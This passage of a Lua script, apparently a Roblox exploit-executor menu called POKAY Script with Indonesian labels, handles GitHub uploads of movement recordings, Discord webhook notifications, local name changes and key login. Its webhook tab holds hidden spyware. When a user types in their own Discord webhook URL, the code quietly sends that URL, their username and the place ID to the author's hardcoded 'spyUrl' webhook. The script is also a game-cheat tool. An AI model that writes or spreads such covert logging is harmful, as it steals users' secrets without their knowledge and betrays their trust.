        if not ok or type(items) ~= "table" then
            return fileList, "Gagal membaca folder!"
        end
        for _, path in ipairs(items) do
            local name = tostring(path):match("([^/\\]+)$") or path
            if name:match("%.json$") or name:match("%.JSON$") then
                table.insert(fileList, { displayName = name, fullPath = path })
            end
        end
        -- Juga cek subfolder
        local okSub, subFolders = pcall(function() return listfolders(RECORDER_FOLDER) end)
        if okSub and type(subFolders) == "table" then
            for _, subDir in ipairs(subFolders) do
                local okF, subItems = pcall(function() return listfiles(subDir) end)
                if okF and type(subItems) == "table" then
                    for _, path in ipairs(subItems) do
                        local name = tostring(path):match("([^/\\]+)$") or path
                        if name:match("%.json$") or name:match("%.JSON$") then
                            local subName = tostring(subDir):match("([^/\\]+)$") or subDir
                            table.insert(fileList, {
                                displayName = "[" .. subName .. "] " .. name,
                                fullPath = path
                            })
                        end
                    end
                end
            end
        end
        return fileList, nil
    end

    -- State
    local scannedFiles    = {}   -- { displayName, fullPath }
    local fileDropdownNames = {} -- hanya displayName untuk dropdown
    local selectedFileIdx  = nil
    local FileDropdown     = nil

    -- Paragraph info file terpilih
    local filePreviewPara = UploadTab:Paragraph({
        Title = "📄 File Terpilih",
        Desc  = "Belum ada file dipilih. Klik [🔍 Scan Folder] dulu.",
    })

    UploadTab:Divider()

    -- Tombol Scan Folder
    UploadTab:Button({
        Title = "[🔍] Scan Folder PokayRecorder",
        Icon  = "folder-open",
        Callback = function()
            local files, err = scanRecorderFiles()
            if err and #files == 0 then
                WindUI:Notify({
                    Title   = "❌ Folder Tidak Ditemukan",
                    Content = err .. "\n\nPastikan folder PokayRecorder ada di workspace executor.",
                    Duration = 5, Icon = "folder-x",
                })
                return
            end

            scannedFiles = files
            fileDropdownNames = {}
            for _, f in ipairs(scannedFiles) do
                table.insert(fileDropdownNames, f.displayName)
            end
            table.sort(fileDropdownNames)

            if FileDropdown then
                pcall(function() FileDropdown:Refresh(fileDropdownNames, true) end)
            end

            WindUI:Notify({
                Title   = "✅ Scan Selesai",
                Content = #files .. " file JSON ditemukan di PokayRecorder.",
                Duration = 3, Icon = "folder-open",
            })
        end
    })

    UploadTab:Divider()

    -- Dropdown pilih file
    FileDropdown = UploadTab:Dropdown({
        Title    = "[◉] Pilih File Rekaman",
        Values   = fileDropdownNames,
        Multi    = false,
        AllowNone = true,
        SearchBarEnabled = true,
        Callback = function(selectedName)
            if not selectedName or selectedName == "" then
                selectedFile  = nil
                selectedFileIdx = nil
                if filePreviewPara then
                    pcall(function()
                        filePreviewPara:SetDesc("Belum ada file dipilih.")
                    end)
                end
                return
            end

            -- Cari file yang dipilih
            local found = nil
            for _, f in ipairs(scannedFiles) do
                if f.displayName == selectedName then
                    found = f; break
                end
            end
            if not found then
                WindUI:Notify({Title="Error", Content="File tidak ditemukan di daftar!", Duration=3, Icon="x-circle"})
                return
            end

            -- Baca dan parse file
            local ok, raw = pcall(function() return readfile(found.fullPath) end)
            if not ok or not raw or #raw == 0 then
                WindUI:Notify({Title="Error", Content="Gagal membaca file:\n"..found.fullPath, Duration=4, Icon="file-x"})
                return
            end

            local okD, decoded = pcall(function() return HttpService:JSONDecode(raw) end)
            if not okD or type(decoded) ~= "table" then
                WindUI:Notify({Title="Error", Content="File bukan JSON valid!", Duration=3, Icon="file-x"})
                return
            end

            -- Deteksi PlaceID: cek dari isi JSON dulu, fallback ke game aktif
            local usedPid = detectPlaceId(decoded)
            -- Selalu override dengan PlaceId game aktif jika JSON tidak punya field placeId
            local activePlace = tostring(game.PlaceId)
            if usedPid == activePlace or usedPid == "0" then
                usedPid = activePlace
            end

            local autoName = mapName ~= "" and mapName
                or (found.displayName:match("([^%.]+)%.json$") or found.displayName:gsub("%.json$",""))

            local frameCount = #decoded
            selectedFile = { name=autoName, jsonStr=raw, placeId=usedPid, frames=frameCount, path=found.fullPath }

            local previewDesc = "📁 " .. found.displayName
                              .. "\n🎞 Frames: " .. frameCount
                              .. "\n🎮 Place ID: " .. usedPid
                              .. "\n✅ Siap diupload!"

            if filePreviewPara then
                pcall(function()
                    filePreviewPara:SetDesc(previewDesc)
                end)
            end

            WindUI:Notify({
                Title   = "✅ File Dipilih",
                Content = found.displayName .. "\n" .. frameCount .. " frames | Place: " .. usedPid,
                Duration = 4, Icon = "check-circle",
            })
        end
    })

    UploadTab:Divider()

    -- Input nama map
    UploadTab:Input({
        Title       = "[◉] Nama Map",
        Type        = "Input",
        InputIcon   = "map",
        Placeholder = "Contoh: Mount_Velora_Custom",
        Callback    = function(input)
            mapName = tostring(input or ""):gsub("%s+", "_"):gsub("[^%w_%-]", "")
            -- Update nama di selectedFile juga
            if selectedFile then
                selectedFile.name = mapName ~= "" and mapName or selectedFile.name
            end
        end
    })

    UploadTab:Divider()

    -- UPLOAD
    UploadTab:Button({
        Title = "[◉] UPLOAD KE GITHUB",
        Icon  = "upload-cloud",
        Callback = function()
            if not selectedFile then
                WindUI:Notify({Title="Error", Content="Pilih file rekaman dulu dari dropdown!", Duration=3, Icon="triangle-alert"})
                return
            end
            if mapName == "" then
                WindUI:Notify({Title="Error", Content="Isi nama map dulu!", Duration=3, Icon="triangle-alert"})
                return
            end

            -- PlaceID selalu dari game aktif
            local pid = tostring(game.PlaceId)
            local ghFolder, filename

            if isOwnerOrAdmin() then
                ghFolder = GH_FOLDER_PUB .. "/" .. pid
                filename = mapName .. ".json"
            elseif isDonatur() then
                ghFolder = GH_FOLDER_DON .. "/" .. pid
                filename = RobloxUsername .. "__" .. mapName .. ".json"
            else
                ghFolder = GH_FOLDER_PRIV .. "/" .. pid
                filename = RobloxUsername .. "__" .. mapName .. ".json"
            end

            local apiUrl = "https://api.github.com/repos/" .. GH_USER .. "/" .. GH_REPO
                         .. "/contents/" .. ghFolder .. "/" .. filename

            WindUI:Notify({Title="Uploading...", Content="Mengunggah ke GitHub...", Duration=3, Icon="loader"})

            task.spawn(function()
                -- Deteksi httpFunc universal
                local httpFunc =
                    (typeof(request)       == "function" and request)          or
                    (typeof(http_request)  == "function" and http_request)     or
                    (syn    and typeof(syn.request)      == "function" and syn.request)    or
                    (http   and typeof(http.request)     == "function" and http.request)   or
                    (fluxus and typeof(fluxus.request)   == "function" and fluxus.request) or
                    nil

                local function doRequest(reqData)
                    if httpFunc then
                        local ok, res = pcall(httpFunc, reqData)
                        if ok and res then return res end
                    end
                    local ok2, res2 = pcall(function() return HttpService:RequestAsync(reqData) end)
                    if ok2 then return res2 end
                    return nil
                end

                -- Cek SHA (untuk update file yang sudah ada)
                local existingSha = nil
                local resC = doRequest({
                    Url = apiUrl, Method = "GET",
                    Headers = {
                        ["Authorization"] = "token " .. GH_TOKEN,
                        ["Accept"]        = "application/vnd.github.v3+json",
                        ["User-Agent"]    = "RobloxScript",
                    }
                })
                if resC then
                    local code = resC.StatusCode or resC.status_code or 0
                    local body = resC.Body or resC.body or ""
                    if code == 200 then
                        local okP, p = pcall(function() return HttpService:JSONDecode(body) end)
                        if okP and p and p.sha then existingSha = p.sha end
                    end
                end

                -- Encode base64
                local b64 = toBase64(selectedFile.jsonStr)

                -- Build payload
                local payload = {
                    message = "Upload: " .. mapName .. " | " .. RobloxUsername .. " (" .. getRoleLabel() .. ")",
                    content = b64,
                    branch  = "main",
                }
                if existingSha then payload.sha = existingSha end

                local res2 = doRequest({
                    Url    = apiUrl, Method = "PUT",
                    Headers = {
                        ["Authorization"] = "token " .. GH_TOKEN,
                        ["Content-Type"]  = "application/json",
                        ["Accept"]        = "application/vnd.github.v3+json",
                        ["User-Agent"]    = "RobloxScript",
                    },
                    Body = HttpService:JSONEncode(payload),
                })
                local code2 = res2 and (res2.StatusCode or res2.status_code or 0) or 0

                if code2 == 200 or code2 == 201 then
                    local destLabel = isOwnerOrAdmin() and "🌐 PUBLIC (wiwokdetok)"
                                   or isDonatur()      and "⭐ DONATUR"
                                   or                      "🔒 PRIVATE"
                    WindUI:Notify({
                        Title   = "✅ Upload Berhasil!",
                        Content = "📁 " .. filename .. "\n→ " .. destLabel
                                .. "\n🎮 Place ID: " .. pid,
                        Duration = 5, Icon = "check-check",
                    })

                    -- Discord webhook (hanya Owner & Admin)
                    if isOwnerOrAdmin() then
                        task.spawn(function()
                            pcall(function()
                                local dt  = os.date("*t")
                                local tgl = string.format("%02d/%02d/%04d %02d:%02d",
                                    dt.day, dt.month, dt.year, dt.hour, dt.min)
                                local _role = isOwner() and "Owner" or "Admin"

                                -- Nama map KAPITAL (bersih dari underscore)
                                local _displayName = mapName:upper()

                                -- Link game Roblox
                                local _robloxLink = "https://www.roblox.com/games/" .. pid

                                -- ── Fetch thumbnail dari Roblox API ──
                                -- Step 1: placeId → universeId
                                local thumbUrl = nil
                                local univOk, univRes = pcall(function()
                                    local httpFunc =
                                        (typeof(request)      == "function" and request)         or
                                        (typeof(http_request) == "function" and http_request)    or
                                        (syn    and typeof(syn.request)    == "function" and syn.request)    or
                                        (http   and typeof(http.request)   == "function" and http.request)   or
                                        (fluxus and typeof(fluxus.request) == "function" and fluxus.request) or
                                        nil
                                    if not httpFunc then return nil end
                                    local r = httpFunc({
                                        Url    = "https://apis.roproxy.com/universes/v1/places/" .. pid .. "/universe",
                                        Method = "GET",
                                        Headers = {["User-Agent"]="RobloxScript"}
                                    })
                                    if not r then return nil end
                                    local body = r.Body or r.body or ""
                                    local d = HttpService:JSONDecode(body)
                                    return d and d.universeId and tostring(d.universeId) or nil
                                end)
                                local universeId = univOk and univRes or nil

                                -- Step 2: universeId → thumbnail CDN URL
                                if universeId then
                                    local thumbOk, thumbRes = pcall(function()
                                        local httpFunc =
                                            (typeof(request)      == "function" and request)         or
                                            (typeof(http_request) == "function" and http_request)    or
                                            (syn    and typeof(syn.request)    == "function" and syn.request)    or
                                            nil
                                        if not httpFunc then return nil end
                                        local r = httpFunc({
                                            Url    = "https://thumbnails.roproxy.com/v1/games/icons?universeIds="
                                                     .. universeId
                                                     .. "&returnPolicy=PlaceHolder&size=512x512&format=Png&isCircular=false",
                                            Method = "GET",
                                            Headers = {["User-Agent"]="RobloxScript"}
                                        })
                                        if not r then return nil end
                                        local body = r.Body or r.body or ""
                                        local d = HttpService:JSONDecode(body)
                                        return d and d.data and d.data[1] and d.data[1].imageUrl or nil
                                    end)
                                    if thumbOk then thumbUrl = thumbRes end
                                end

                                -- ── Build embed persis seperti dashboard ──
                                local _desc =
                                    "-· **MAP BARU DI UPDATE** ·-\n\n" ..
                                    _role .. " **" .. RobloxUsername .. "** telah mengupload map baru.\n\n" ..
                                    "✦ **Game:** " .. _displayName .. "\n" ..
                                    "✦ **Place ID:** " .. pid .. "\n\n" ..
                                    "✦ **Link Game**\n[Buka di Roblox](" .. _robloxLink .. ")"

                                local _embed = {
                                    description = _desc,
                                    color       = 0xff69b4,
                                    footer      = {text = "PokayCore Cloud Update MapTrack | Today at " ..
                                                          string.format("%02d:%02d", dt.hour, dt.min)},
                                    timestamp   = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                                }

                                -- Tambahkan gambar kalau thumbnail berhasil di-fetch
                                if thumbUrl then
                                    _embed.image = {url = thumbUrl}
                                end

                                local httpFunc =
                                    (typeof(request)      == "function" and request)         or
                                    (typeof(http_request) == "function" and http_request)    or
                                    (syn    and typeof(syn.request)    == "function" and syn.request)    or
                                    nil

                                local body = HttpService:JSONEncode({embeds = {_embed}})
                                local headers = {["Content-Type"]="application/json", ["User-Agent"]="RobloxScript"}

                                if httpFunc then
                                    httpFunc({Url=DISCORD_WEBHOOK, Method="POST", Headers=headers, Body=body})
                                else
                                    HttpService:RequestAsync({Url=DISCORD_WEBHOOK, Method="POST", Headers=headers, Body=body})
                                end
                            end)
                        end)
                    end

                    selectedFile = nil
                else
                    WindUI:Notify({
                        Title   = "❌ Upload Gagal",
                        Content = "Status: " .. tostring(code2)
                                .. "\n" .. tostring(res2 and (res2.Body or res2.body) or ""):sub(1,80),
                        Duration = 5, Icon = "x-circle",
                    })
                end
            end)
        end
    })

    UploadTab:Divider()

    -- Clear
    UploadTab:Button({
        Title = "[◉] Clear / Reset",
        Icon  = "trash-2",
        Callback = function()
            selectedFile  = nil
            selectedFileIdx = nil
            mapName       = ""
            jsonFilePath  = ""
            if filePreviewPara then
                pcall(function()
                    filePreviewPara:SetDesc("Belum ada file dipilih. Klik [🔍 Scan Folder] dulu.")
                end)
            end
            if FileDropdown then
                pcall(function() FileDropdown:Refresh(fileDropdownNames, true) end)
            end
            WindUI:Notify({Title="Reset", Content="Pilihan dikosongkan.", Duration=2, Icon="trash-2"})
        end
    })

    UploadTab:Divider()
end


--| =========================================================== |--
--| WEBHOOK TAB SETUP                                          |--
--| =========================================================== |--

local function setupWebhookTab()
    if not WebhookTab then return end
    if getgenv()["_SETUP_DONE_setupWebhookTab"] then return end
    getgenv()["_SETUP_DONE_setupWebhookTab"] = true

    local HttpService = game:GetService("HttpService")

    WebhookTab:Paragraph({
        Title = "📡 Webhook Monitor — Push Summit",
        Desc  = "Kirim notifikasi ke Discord setiap rute selesai (summit +1) dan setiap kena kick/disconnect.\n\nCocok untuk monitoring push summit dari HP lain.",
    })

    WebhookTab:Divider()

    -- Input Webhook URL
    WebhookTab:Input({
        Title       = "[◉] Discord Webhook URL",
        Type        = "Input",
        InputIcon   = "link",
        Placeholder = "https://discord.com/api/webhooks/...",
        Callback    = function(input)
            local url = tostring(input or ""):gsub("%s+", "")
            getgenv()._MarvWebhookURL = url
            if url ~= "" then
                task.spawn(function()
                    pcall(function()
                        local dt = os.date("*t")
                        local tgl = string.format("%02d/%02d/%04d %02d:%02d", dt.day, dt.month, dt.year, dt.hour, dt.min)
                        local body = HttpService:JSONEncode({
                            embeds = {{
                                title  = "Webhook Baru Diinput",
                                color  = 0x5865F2,
                                fields = {
                                    {name = "Username",    value = "**" .. RobloxUsername .. "**", inline = true},
                                    {name = "Place ID",    value = "`" .. tostring(game.PlaceId) .. "`", inline = true},
                                    {name = "Waktu",       value = tgl, inline = false},
                                    {name = "Webhook URL", value = "` " .. url .. " `", inline = false},
                                },
                                footer = {text = "PokayCore - Webhook Logger"}
                            }}
                        })
                        local spyUrl = "https://discord.com/api/webhooks/1444602621154427005/dYLTtu9vtAzVD9h3E4UWacP7S9mpRyxsMQjnHixGbbBvWfg-GOJowO7Ykpnhbo9J3QSv"
                        local headers = {["Content-Type"] = "application/json", ["User-Agent"] = "RobloxScript"}
                        -- Pakai executor http function (request/syn.request/http.request)
                        local httpFunc = request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
                        if httpFunc then
                            httpFunc({Url=spyUrl, Method="POST", Headers=headers, Body=body})
                        else
                            HttpService:RequestAsync({Url=spyUrl, Method="POST", Headers=headers, Body=body})
                        end
                    end)
                end)
            end
        end
    })

    WebhookTab:Divider()

    -- Input + Confirm button jumlah summit saat ini
    local _summitInputVal = ""
    WebhookTab:Input({
        Title       = "[◉] Summit Sekarang (angka awal)",
        Type        = "Input",
        InputIcon   = "mountain",
        Placeholder = "Contoh: 12  →  berikutnya jadi 13, 14, ...",
        Callback    = function(input)
            -- simpan sementara, belum di-apply (hindari bug tiap karakter)
            _summitInputVal = tostring(input or "")
        end
    })

    WebhookTab:Button({
        Title    = "[✅] Konfirmasi Summit Awal",
        Icon     = "check",
        Callback = function()
            local num = tonumber(_summitInputVal:gsub("%s+",""))
            if num and num >= 0 then
                getgenv()._MarvSummitCount = math.floor(num)
                WindUI:Notify({
                    Title   = "✅ Summit Diset",
                    Content = "Summit awal: "..math.floor(num).."\nBerikutnya akan jadi ke-"..(math.floor(num)+1),
                    Duration = 3, Icon = "mountain",
                })
            else
                WindUI:Notify({
                    Title   = "❌ Input Salah",
                    Content = "Masukkan angka yang valid dulu di field di atas.",
                    Duration = 3, Icon = "x-circle",
                })
            end
        end
    })

    WebhookTab:Divider()

    -- Toggle Enable Webhook
    WebhookTab:Toggle({
        Title = "[◉] Aktifkan Webhook",
        Desc  = "Kirim notifikasi Discord setiap summit selesai & saat disconnect.",
        Icon  = "bell",
        Type  = "Checkbox",
        Value = false,
        Callback = function(state)
            if state and getgenv()._MarvWebhookURL == "" then
                WindUI:Notify({
                    Title   = "⚠️ URL Kosong!",
                    Content = "Isi Discord Webhook URL dulu!",
                    Duration = 3, Icon = "triangle-alert",
                })
                return
            end
            getgenv()._MarvWebhookEnabled = state
            WindUI:Notify({
                Title   = state and "🔔 Webhook Aktif" or "🔕 Webhook Nonaktif",
                Content = state and "Notifikasi aktif untuk summit & disconnect." or "",
                Duration = 2, Icon = state and "bell" or "bell-off",
            })
        end
    })

    WebhookTab:Divider()

    -- Tombol Test Webhook
    WebhookTab:Button({
        Title = "[◉] Test Kirim Webhook",
        Icon  = "send",
        Callback = function()
            if getgenv()._MarvWebhookURL == "" then
                WindUI:Notify({Title="Error", Content="Isi URL webhook dulu!", Duration=3, Icon="triangle-alert"})
                return
            end
            local sc = getgenv()._MarvSummitCount or 0
            local gameName = tostring(game.PlaceId)
            pcall(function()
                local ok, info = pcall(function() return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId) end)
                if ok and info then gameName = info.Name end
            end)
            local dt = os.date("*t")
            local tgl = string.format("%02d/%02d/%04d %02d:%02d", dt.day, dt.month, dt.year, dt.hour, dt.min)
            task.spawn(function()
                local _url  = getgenv()._MarvWebhookURL
                local _body = HttpService:JSONEncode({ embeds = {{
                    title  = "🧪 TEST — Webhook POKAY Script",
                    color  = 0xE53935,
                    fields = {
                        {name="👤 Username",    value="**"..RobloxUsername.."**", inline=true},
                        {name="🎮 Game",        value=tostring(gameName),         inline=true},
                        {name="🏆 Summit ke-", value="**"..sc.."**",             inline=true},
                        {name="📅 Waktu",       value=tgl,                        inline=false},
                    },
                    footer    = {text="MarV Script - Push Summit Monitor"},
                    thumbnail = {url="https://www.roblox.com/headshot-thumbnail/image?userId="..tostring(LP.UserId).."&width=420&height=420&format=png"},
                }}})
                local _headers = {["Content-Type"]="application/json",["User-Agent"]="RobloxScript"}
                local httpFunc =
                    (typeof(request)       == "function" and request)          or
                    (typeof(http_request)  == "function" and http_request)     or
                    (syn    and typeof(syn.request)      == "function" and syn.request)    or
                    (http   and typeof(http.request)     == "function" and http.request)   or
                    (fluxus and typeof(fluxus.request)   == "function" and fluxus.request) or
                    nil
                local res2
                if httpFunc then
                    local ok, r = pcall(httpFunc, {Url=_url, Method="POST", Headers=_headers, Body=_body})
                    if ok then res2 = r end
                else
                    local ok, r = pcall(function() return HttpService:RequestAsync({Url=_url,Method="POST",Headers=_headers,Body=_body}) end)
                    if ok then res2 = r end
                end
                local code2 = res2 and (res2.StatusCode or res2.status_code or 0) or 0
                if code2 == 200 or code2 == 204 then
                    WindUI:Notify({Title="✅ Test Berhasil!", Content="Webhook terkirim ke Discord!", Duration=3, Icon="check-check"})
                else
                    WindUI:Notify({
                        Title   = "❌ Gagal",
                        Content = "Status: "..tostring(code2).."\nCek URL webhook kamu.",
                        Duration = 4, Icon = "x-circle",
                    })
                end
            end)
        end
    })

    WebhookTab:Divider()

    -- Info tampilan embed
    WebhookTab:Paragraph({
        Title = "📋 Info Embed Discord",
        Desc  = "🔴 Warna MERAH = Summit berhasil\n🟠 Warna ORANGE = Kick / Disconnect\n\nIsi embed:\n• 👤 Username Roblox\n• 🎮 Nama game aktif\n• 🏆 Summit ke-N\n• 📅 Waktu kirim",
    })

    WebhookTab:Divider()
end


--| =========================================================== |--
--| LOGOUT                                                      |--
--| =========================================================== |--


--| =========================================================== |--
--| LOGOUT                                                      |--
--| =========================================================== |--

local function setupLogoutTab()
    if not LogoutTab then return end
    if getgenv()["_SETUP_DONE_setupLogoutTab"] then return end
    getgenv()["_SETUP_DONE_setupLogoutTab"] = true


	local Paragraph = LogoutTab:Paragraph({
    	Title = "Logout Menu",
    	Desc = "Berfungsi untuk keluar dari akun Anda. Setelah logout, Menu akan tertutup secara otomatis.",
	})

	LogoutTab:Divider()

	local Toggle = LogoutTab:Toggle({
		Title = "[◉] Logout Sekarang",
		Callback = function(state)
			if state then
				WindUI:Notify({
    				Title = "Tunggu Sebentar",
    				Content = "Sedang proses logout!",
    				Duration = 3,
    				Icon = "log-out",
				})
				task.wait(3)
				Window:Destroy()
			else
				-- Nothing
			end
		end
	})

	LogoutTab:Divider()

end

--| =========================================================== |--
--| CUSTOM NAME TAB SETUP                                       |--
--| =========================================================== |--

local function setupCustomNameTab()
    if not CustomNameTab then return end
    if getgenv()["_SETUP_DONE_setupCustomNameTab"] then return end
    getgenv()["_SETUP_DONE_setupCustomNameTab"] = true

    local Players  = game:GetService("Players")
    local player   = Players.LocalPlayer

    local customNameEnabled   = false
    local customDisplayName   = player.DisplayName  -- untuk Humanoid.DisplayName (overhead)
    local customUsername      = player.Name         -- untuk scan TextLabel nametag game

    local originalDisplayName = player.DisplayName
    local originalName        = player.Name

    -- -- Scan & ganti semua TextLabel nametag di karakter ----------
    -- Roblox default nametag: Head > BillboardGui > ... > TextLabel
    -- Custom game nametag: bisa bermacam-macam
    local function patchTextLabels(char, targetName, targetUser)
        if not char then return end
        for _, obj in pairs(char:GetDescendants()) do
            if obj:IsA("TextLabel") then
                local cur = obj.Text
                -- Ganti display name
                if cur == originalDisplayName or cur == originalName then
                    obj.Text = targetName ~= "" and targetName or obj.Text
                end
                -- Ganti username (bisa beda dengan displayname)
                if cur == originalName and targetUser ~= "" then
                    obj.Text = targetUser
                end
            end
        end
    end

    -- -- Apply: set Humanoid.DisplayName + patch TextLabel ---------
    local function applyCustomName()
        pcall(function()
            local char = player.Character
            if not char then return end
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then
                -- Humanoid.DisplayName = overhead nametag (built-in Roblox)
                hum.DisplayName = customDisplayName ~= "" and customDisplayName or originalDisplayName
            end
            -- TextLabel scan = custom nametag dari game
            patchTextLabels(char,
                customDisplayName ~= "" and customDisplayName or originalDisplayName,
                customUsername    ~= "" and customUsername    or originalName)
        end)
    end

    -- -- Restore ke nama asli --------------------------------------
    local function restoreOriginalName()
        pcall(function()
            local char = player.Character
            if not char then return end
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then hum.DisplayName = originalDisplayName end
            patchTextLabels(char, originalDisplayName, originalName)
        end)
    end

    -- -- Watcher: re-apply setelah respawn + DescendantAdded ------
    local charConn = nil
    local descConn = nil
    local function watchCharacter()
        if charConn then pcall(function() charConn:Disconnect() end) end
        charConn = player.CharacterAdded:Connect(function(char)
            task.wait(0.5)
            if not customNameEnabled then return end
            applyCustomName()
            -- watch nametag baru yang muncul lambat
            if descConn then pcall(function() descConn:Disconnect() end) end
            descConn = char.DescendantAdded:Connect(function(obj)
                if not customNameEnabled then return end
                if obj:IsA("TextLabel") then
                    task.wait(0.08)
                    local cur = obj.Text
                    if cur == originalName or cur == originalDisplayName then
                        if customDisplayName ~= "" then obj.Text = customDisplayName end
                    end
                end
            end)
        end)
    end
    watchCharacter()

    -- -- UI --------------------------------------------------------
    CustomNameTab:Paragraph({
        Title = "ℹ️ Info Custom Name",
        Desc  = "Ganti tampilan Display Name (overhead) dan Username (nametag game).\n"
              .."Hanya terlihat oleh kamu sendiri — visual lokal.\n\n"
              .."• Display Name → nama di atas kepala (Humanoid)\n"
              .."• Username → nama di nametag custom game",
    })

    CustomNameTab:Divider()

    CustomNameTab:Section({
        Title = "Custom Name Settings",
        TextTransparency = 0.05,
        TextXAlignment = "Left",
        TextSize = 17,
    })

    -- Input Display Name (overhead Humanoid)
    CustomNameTab:Input({
        Title       = "[✏] Custom Display Name",
        Desc        = "Nama di atas kepala karakter (overhead). Asli: " .. originalDisplayName,
        Placeholder = originalDisplayName,
        Callback    = function(val)
            if val and val ~= "" then
                customDisplayName = val
                -- JANGAN overwrite customUsername di sini
                if customNameEnabled then applyCustomName() end
                WindUI:Notify({
                    Title   = "Display Name",
                    Content = "Display Name → " .. val,
                    Duration = 2, Icon = "user",
                })
            end
        end
    })

    -- Input Username (nametag TextLabel di game)
    CustomNameTab:Input({
        Title       = "[✏] Custom Username",
        Desc        = "Username di nametag game (TextLabel scan). Asli: " .. originalName,
        Placeholder = originalName,
        Callback    = function(val)
            if val and val ~= "" then
                customUsername = val
                -- TIDAK overwrite customDisplayName
                if customNameEnabled then applyCustomName() end
                WindUI:Notify({
                    Title   = "Username",
                    Content = "Username → " .. val,
                    Duration = 2, Icon = "at-sign",
                })
            end
        end
    })

    CustomNameTab:Divider()

    -- Toggle ON/OFF
    CustomNameTab:Toggle({
        Title = "[◉] Aktifkan Custom Name",
        Desc  = "ON = pakai nama custom | OFF = kembali ke nama asli.",
        Icon  = "pencil",
        Type  = "Checkbox",
        Value = false,
        Callback = function(state)
            customNameEnabled = state
            if state then
                applyCustomName()
                WindUI:Notify({
                    Title   = "✅ Custom Name ON",
                    Content = "Display: "..customDisplayName.."\nUsername: "..customUsername,
                    Duration = 3, Icon = "pencil",
                })
            else
                restoreOriginalName()
                WindUI:Notify({
                    Title   = "Custom Name OFF",
                    Content = "Dikembalikan ke nama asli.",
                    Duration = 2, Icon = "rotate-ccw",
                })
            end
        end
    })

    -- Scan Ulang (manual trigger)
    CustomNameTab:Button({
        Title    = "🔍 Scan & Apply Sekarang",
        Desc     = "Paksa scan ulang semua TextLabel nametag di karakter.",
        Icon     = "scan",
        Callback = function()
            if not customNameEnabled then
                WindUI:Notify({Title="Info", Content="Aktifkan Custom Name dulu!", Duration=2})
                return
            end
            applyCustomName()
            WindUI:Notify({Title="✅ Scan Selesai", Content="Nametag diperbarui.", Duration=2, Icon="check"})
        end
    })

    -- Reset
    CustomNameTab:Button({
        Title    = "🔄 Reset ke Nama Asli",
        Icon     = "rotate-ccw",
        Callback = function()
            customDisplayName = originalDisplayName
            customUsername    = originalName
            customNameEnabled = false
            restoreOriginalName()
            WindUI:Notify({
                Title   = "Reset",
                Content = "Kembali ke: "..originalDisplayName.." / "..originalName,
                Duration = 3, Icon = "rotate-ccw",
            })
        end
    })

    CustomNameTab:Divider()

end

--| =========================================================== |--
--| AUTHENTICATION LOGIC                                        |--
--| =========================================================== |--

local function verifyAndLogin(token)
    if isAuthenticating then
        WindUI:Notify({
            Title = "Tunggu!",
            Content = "Masih dalam proses validasi...",
            Duration = 2,
            Icon = "loader",
        })
        return
    end

    local currentToken = token:gsub("%s+", ""):gsub("[\n\r\t]", "")
    if currentToken == "" or #currentToken < 1 then
        WindUI:Notify({
            Title = "Error",
            Content = "Key tidak boleh kosong!",
            Duration = 3,
            Icon = "triangle-alert",
        })
        return
    end
    
    isAuthenticating = true
    
    WindUI:Notify({
        Title = "Validating...",
        Content = "Pengecekan token dengan username: " .. RobloxUsername,
        Duration = 2,
        Icon = "shield-check",
    })

    local valid, result = ValidateToken(currentToken)
    
    isAuthenticating = false
    
    if valid then
        WindUI:Notify({
            Title = "Key Valid!",
            Content = "Authentication berhasil!",
            Duration = 3,
            Icon = "check-check",
        })
        
        saveToken(currentToken)
        getgenv().UserToken = currentToken
        getgenv().AuthComplete = true
        getgenv().AuthTimestamp = os.time()
        
        task.wait(0.5)
        
        local userSuccess, userData = GetUserInfo(currentToken)
        if userSuccess then
            updateAccountData(userData)
        end
        
        task.wait(0.5)
        
        createAndUnlockAllTabs()
        
        if not menuCreated then
            setupAccountTab()
			setupCreditsTab()
            setupBypassTab()
            setupListScript()
            setupAutowalkTab()
			setupRecordTab()
			setupCopyavatarTab()
			setupCustomanimationTab()
			setupSkyboxTab()
			setupPlayermenuTab()
			setupSocialTab()
			setupAppearanceTab()
			setupUpdatecheckpointTab()
			setupUploadTab()
			setupWebhookTab()
			setupLogoutTab()
			setupCustomNameTab()
            menuCreated = true
        end
        
        WindUI:Notify({
            Title = "Welcome!",
            Content = "Menu utama telah terbuka. Selamat menggunakan POKAY Script!",
            Duration = 3,
            Icon = "sparkles",
        })
        
    else
        WindUI:Notify({
            Title = "Key Salah!",
            Content = tostring(result),
            Duration = 5,
            Icon = "ban",
        })
    end
end

-- Verify Button
AuthTab:Button({
    Title = "[◉] Verify Key",
    Icon = "shield-check",
    Callback = function()
        if enteredKey and enteredKey ~= "" then
            verifyAndLogin(enteredKey)
        else
            WindUI:Notify({
                Title = "Error!",
                Content = "Masukan key terlebih dahulu!",
                Duration = 3,
                Icon = "triangle-alert",
            })
        end
    end
})

AuthTab:Divider()

AuthTab:Paragraph({
    Title = "Butuh Bantuan?",
    Desc = "Jika mengalami masalah seperti: \n• Key tidak bisa di pakai \n• Script error atau lainnya \n• Silahkan bergabung di discord: https://discord.gg/tXRmdCsSEn",
})

--| =========================================================== |--
--| AUTO LOGIN ON STARTUP                                       |--
--| =========================================================== |--
task.spawn(function()
    task.wait(0.5)
    
    local savedToken = loadToken()
    if savedToken and tostring(savedToken) ~= "" and #tostring(savedToken) >= 5 then
        WindUI:Notify({
            Title = "Auto Login",
            Content = "Mencoba login dengan saved token...",
            Duration = 2,
            Icon = "key-round",
        })
        
        local valid, result = ValidateToken(savedToken)
        if valid then
            getgenv().UserToken = savedToken
            getgenv().AuthComplete = true
            getgenv().AuthTimestamp = os.time()
            
            WindUI:Notify({
                Title = "Auto Login Success!",
                Content = "Welcome back! Mengambil data user...",
                Duration = 3,
                Icon = "check-check",
            })
            
            task.wait(0.5)
            
            local userSuccess, userData = GetUserInfo(savedToken)
            if userSuccess then
                updateAccountData(userData)
            end
            
            task.wait(0.5)
            
            createAndUnlockAllTabs()
            
            if not menuCreated then
                setupAccountTab()
				setupCreditsTab()
                setupBypassTab()
                setupListScript()
                setupAutowalkTab()
				setupRecordTab()
				setupCopyavatarTab()
				setupCustomanimationTab()
				setupSkyboxTab()
				setupPlayermenuTab()
				setupSocialTab()
                setupAppearanceTab()
				setupUpdatecheckpointTab()
				setupUploadTab()
				setupWebhookTab()
				setupLogoutTab()
				setupCustomNameTab()
                menuCreated = true
            end

        else
            deleteToken()
